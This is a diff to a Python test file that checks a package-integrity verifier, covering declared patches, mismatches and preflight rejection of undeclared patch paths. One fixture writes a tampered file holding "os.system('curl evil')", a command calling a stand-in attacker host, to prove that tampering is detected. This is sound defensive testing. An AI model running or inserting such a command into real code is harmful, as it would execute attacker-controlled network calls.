@@ -496,7 +496,13 @@ def test_distribution_integrity_rejects_unhashed_humming_file(
         lambda name: FakeDistribution(),
     )
 
-    status, mismatches, overlay, unhashed_bytecode = _distribution_integrity()
+    (
+        status,
+        mismatches,
+        overlay,
+        unhashed_bytecode,
+        declared,
+    ) = _distribution_integrity()
 
     assert status == "mismatch"
     assert mismatches == ("humming/local_override.py",)
@@ -555,7 +561,13 @@ def test_distribution_integrity_tolerates_unhashed_cached_bytecode(
         lambda name: FakeDistribution(),
     )
 
-    status, mismatches, overlay, unhashed_bytecode = _distribution_integrity()
+    (
+        status,
+        mismatches,
+        overlay,
+        unhashed_bytecode,
+        declared,
+    ) = _distribution_integrity()
 
     assert status == "record-matched"
     assert mismatches == ()
@@ -605,11 +617,128 @@ def test_overlay_marker_in_unhashed_bytecode_is_still_detected(
         lambda name: FakeDistribution(),
     )
 
-    status, mismatches, overlay, unhashed_bytecode = _distribution_integrity()
+    (
+        status,
+        mismatches,
+        overlay,
+        unhashed_bytecode,
+        declared,
+    ) = _distribution_integrity()
 
     assert overlay is True
     assert status == "record-matched"
     assert unhashed_bytecode == 1
+
+
+def _single_file_distribution(tmp_path, relative, payload, record_hash):
+    path = tmp_path / relative
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(payload)
+
+    class FakeDistribution:
+        files = [
+            SimpleNamespace(
+                parts=PurePosixPath(relative).parts,
+                hash=SimpleNamespace(mode="sha256", value=record_hash),
+                path=relative,
+            ),
+        ]
+
+        def locate_file(self, file):
+            return tmp_path / file.path
+
+    return FakeDistribution()
+
+
+def _b64(payload: bytes) -> str:
+    import base64
+
+    return (
+        base64.urlsafe_b64encode(hashlib.sha256(payload).digest())
+        .rstrip(b"=")
+        .decode("ascii")
+    )
+
+
+def test_distribution_integrity_reports_declared_patch(monkeypatch, tmp_path):
+    """A reviewed patch is surfaced, not silently accepted as pristine."""
+
+    relative = "humming/schema/compressed_tensors.py"
+    patched = b'assert self.format in ["pack-quantized"]\n'
+    pristine = b"assert self.format in []\n"
+    distribution = _single_file_distribution(
+        tmp_path, relative, patched, _b64(pristine)
+    )
+    monkeypatch.setattr(
+        "pipeline.m3_humming_w4a8.importlib.metadata.distribution",
+        lambda name: distribution,
+    )
+    monkeypatch.setattr(
+        "pipeline.m3_humming_w4a8.DECLARED_PATCH_SHA256",
+        {relative: hashlib.sha256(patched).hexdigest()},
+    )
+
+    status, mismatches, overlay, _, declared = _distribution_integrity()
+
+    assert status == "record-matched-with-declared-patch"
+    assert mismatches == ()
+    assert declared == (relative,)
+    assert overlay is False
+
+
+def test_declared_path_with_unexpected_content_is_still_a_mismatch(
+    monkeypatch,
+    tmp_path,
+):
+    relative = "humming/schema/compressed_tensors.py"
+    tampered = b"import os; os.system('curl evil')\n"
+    pristine = b"assert self.format in []\n"
+    expected_patch = b'assert self.format in ["pack-quantized"]\n'
+    distribution = _single_file_distribution(
+        tmp_path, relative, tampered, _b64(pristine)
+    )
+    monkeypatch.setattr(
+        "pipeline.m3_humming_w4a8.importlib.metadata.distribution",
+        lambda name: distribution,
+    )
+    monkeypatch.setattr(
+        "pipeline.m3_humming_w4a8.DECLARED_PATCH_SHA256",
+        {relative: hashlib.sha256(expected_patch).hexdigest()},
+    )
+
+    status, mismatches, _, _, declared = _distribution_integrity()
+
+    assert status == "mismatch"
+    assert mismatches == (relative,)
+    assert declared == ()
+
+
+def test_preflight_accepts_declared_patch_integrity():
+    runtime = replace(
+        valid_runtime(),
+        humming_source_integrity="record-matched-with-declared-patch",
+        humming_declared_patches=("humming/schema/compressed_tensors.py",),
+    )
+
+    report = evaluate_preflight(valid_config(), valid_abi_report(), runtime)
+
+    assert report["valid"] is True
+    assert report["details"]["humming_declared_patches"] == (
+        "humming/schema/compressed_tensors.py",
+    )
+
+
+def test_preflight_rejects_undeclared_patch_path():
+    runtime = replace(
+        valid_runtime(),
+        humming_source_integrity="record-matched-with-declared-patch",
+        humming_declared_patches=("humming/kernel/humming.cuh",),
+    )
+
+    report = evaluate_preflight(valid_config(), valid_abi_report(), runtime)
+
+    assert report["valid"] is False
+    assert report["reason_codes"] == ["HUMMING_UNDECLARED_PATCH"]
 
 
 def test_preflight_cli_writes_valid_report(monkeypatch, tmp_path):
